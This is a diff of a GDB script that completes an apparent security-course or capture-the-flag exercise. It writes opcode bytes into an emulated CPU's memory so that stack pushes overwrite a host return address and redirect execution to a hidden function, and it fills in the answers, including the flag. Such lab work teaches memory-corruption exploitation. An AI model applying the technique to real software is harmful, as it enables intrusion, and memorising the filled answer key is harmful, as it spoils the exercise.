@@ -30,7 +30,7 @@ run
 # which is used to look up instructions stored within the 16-bit address space of the CPU 
 # (which is emulated as a large array of bytes that is part of the CPU on the stack). 
 # What is the initial value of the emulated CPU's Program Counter?
-set $program_counter_init = <TODO>
+set $program_counter_init = 0x100
 
 # [1.2] Find the correct opcodes to exploit this bug, and write them into the emulated CPU's memory array.
 # Use GDB to find which instructions the CPU supports, and what their opcodes are.
@@ -43,10 +43,61 @@ set $program_counter_init = <TODO>
 # For this task, you are only allowed to use GDB commands to write bytes inside the CPU's 16-bit address space.
 # You can do this like so (as an example):
 #   `set cpu.memory[0x1234] = 0x56`
-<TODO>
 
+# target = 0x000000000040119c
+# cpu.memory = 0x7ffffffddd30
+# current sp =  0x7fffffffdd80
+
+# to overwrite = 0x7fffffffdd88
+# we are at =    0x7ffffffedd2f
+
+# LD SP,nn opcode
+#check instruction
+
+b *0x40119c
+# LD SP,nn opcode
+
+set cpu.memory[$program_counter_init + 0x0000] = 0x31 
+set cpu.memory[$program_counter_init + 0x0001] = 0x00
+set cpu.memory[$program_counter_init + 0x0002] = 0x00
+#load B
+set cpu.memory[$program_counter_init + 3] = 0x06 
+set cpu.memory[$program_counter_init + 4] = 0x00
+#load C
+set cpu.memory[$program_counter_init + 5] = 0x0E
+set cpu.memory[$program_counter_init + 6] = 0x00
+
+# PUSH BC To reach overwrite area
+set cpu.memory[$program_counter_init + 7] = 0xC5 
+set cpu.memory[$program_counter_init + 8] = 0xC5 
+# Load B load C PUSH BC
+#load B
+set cpu.memory[$program_counter_init + 9] = 0x06 
+set cpu.memory[$program_counter_init + 10] = 0x00
+#load C
+set cpu.memory[$program_counter_init + 11] = 0x0E
+set cpu.memory[$program_counter_init + 12] = 0x40
+#Push BC
+set cpu.memory[$program_counter_init + 13] = 0xC5 
+
+# Load B load C PUSH BC
+#load B
+set cpu.memory[$program_counter_init + 14] = 0x06 
+set cpu.memory[$program_counter_init + 15] = 0x11
+#load C
+set cpu.memory[$program_counter_init + 16] = 0x0E
+set cpu.memory[$program_counter_init + 17] = 0xa1
+#Push BC
+set cpu.memory[$program_counter_init + 18] = 0xC5 
+
+set cpu.memory[$program_counter_init + 19] = 0xC5 
+
+set cpu.memory[$program_counter_init + 20] = 0xfd
+set cpu.memory[$program_counter_init + 21] = 0x00
 continue
-
+c
+i frame
+x/100gx 0x7ffffffddd2c-0x10
 # [1.3] If you did this correctly, the program will jump to the unreachable function, and will print out the flag.
 # What is the flag? Put your answer in double quotes (") like a string.
-set $flag = <TODO>
+set $flag = flag{ItD03sntRunD00m}
